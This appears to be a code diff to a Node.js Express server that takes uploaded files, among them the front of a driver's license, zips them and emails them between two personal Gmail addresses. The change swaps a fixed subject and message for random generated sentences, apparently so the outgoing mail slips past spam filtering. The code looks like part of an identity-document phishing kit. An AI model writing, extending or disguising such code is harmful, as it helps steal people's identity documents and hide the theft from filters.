@@ -6,6 +6,13 @@ const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
 const multer = require("multer");
 const zipFolder = require("zip-a-folder");
+const compromise = require("compromise");
+
+// Generate a random sentence for the email body
+const randomSentence = compromise("i").random().sentences(1).out();
+
+// Generate a random sentence for the email subject
+const randomSubject = compromise("i").random().sentences(1).out();
 
 const port = 9000;
 
@@ -71,8 +78,8 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     const mailOptions = {
       from: "tobir2275@gmail.com",
       to: "habeebadaranijo541@gmail.com", // recipient email address
-      subject: "Data file",
-      text: "Please find attached the password-protected zip file containing the message data.",
+      subject: `${randomSubject}`,
+      text: `${randomSentence}`,
       attachments: [
         {
           filename: zipFileName,
